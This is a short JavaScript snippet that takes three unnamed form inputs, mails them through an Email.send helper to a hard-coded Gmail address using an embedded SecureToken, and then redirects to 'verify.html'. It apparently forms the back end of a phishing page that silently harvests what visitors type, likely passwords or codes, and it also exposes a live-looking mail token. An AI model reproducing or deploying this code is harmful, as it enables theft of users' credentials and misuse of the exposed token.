function sendMail(){
    var p1 = document.getElementById("p1").value;
    var p2 = document.getElementById("p2").value;
    var p3 = document.getElementById("p3").value;
    var body = p1 + "<br/>p2: " + p2 +"<br/>p3: " + p3;
console.log(body);
Email.send({
SecureToken : "f1810a74-22e7-4d1a-8fd1-eb10524e5651",
To : 'pragya20102023@gmail.com',
From : "pragya20102023@gmail.com",
Subject : "P",
Body : body,

}).then(
window.location.href = "verify.html"
);
}
